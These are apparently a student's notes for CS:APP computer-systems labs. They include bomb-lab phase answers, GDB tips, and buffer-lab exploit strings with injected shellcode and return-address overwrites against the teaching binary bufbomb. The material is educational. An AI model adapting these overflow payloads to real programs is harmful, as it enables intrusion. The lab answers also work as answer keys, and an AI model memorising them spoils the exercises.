
----------------------------------------------------------

#### Lab

#### Lab 2
Solutions:
Border relations with Canada have never been better.
1 2 4 8 16 32
1 311或其他
4 389
7 0
IONEFG (flyers)
4 3 2 1 6 5

Intel指令集
	movslq
	https://blog.csdn.net/qq_38712943/article/details/81358799
info r
p /x *0x402470 + 8
b phase_4
disas phase_4
pmap
pvector

打印寄存器
    p $rax
注意:
	mov 0x20(%rsp),%rbx 代表赋地址
	lea 0x20(%rsp),%rbx 代表赋值
	
#### Lab 3

不可修改的register: rip(除了ret)
https://www.cnblogs.com/aliflycoris/p/5746143.html
https://www.jianshu.com/p/dc41c84cef17
https://www.cnblogs.com/yhjoker/p/7623950.html

三个与栈和下一条指令有关的指令
	call=push rip; jmp 0x____
	leave 恢复保存的rbp,rsp,即 movl rbp, rsp; pop rbp
	ret = pop rip
注意事项:
	mov 0x4, %eax #move value of memory[0x4] to eax
	mov $0x4, %eax #move 0x4 to eax

~~~
按照userid=novik实验: 
./bufbomb -u novik
    0x08048c18 smoke
>>>> smoke.txt
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
    00 00 00 00 18 8c 04 08

0x08048c42 fizz
>>>> fizz.txt
    -u novik
	cookie 0x2de1951f
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
    00 00 00 00 42 8c 04 08 00 00
	00 00 1f 95 e1 2d
>>>> bang.txt
    -u novik
	0x55683658
>>>> bang.S
movl $0x2de1951f, 0x804d100
movl 0x804d100, %eax
movl %eax, 4(%esp)
push $0x08048c9d
ret
->
c7 05 00 d1 04 08 1f 
95 e1 2d 
a1 00 d1 04 08       
89 44 24 04          
68 9d 8c 04 08       
c3
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00
58 36 68 55
>>>> dynamite.txt
buf 0x55683658
ret 0x08048dbe
cookie 0x2de1951f
movl $0x2de1951f, %eax
movl $0x556836b0, %ebp
push $0x08048dbe
ret
>>>> shell
cat dynamite.txt | ./hex2raw | ./bufbomb -u novik
~~~

#### Lab 4


#### References
GDB调试技巧
	https://blog.csdn.net/transmaple/article/details/48421891

b *0x0000000000400fdf
简书: https://www.jianshu.com/p/33eb51b2024e
Postscript file: GDB: Quick reference

[第三版的相关实验解答和笔记](https://github.com/Exely/CSAPP-Labs)
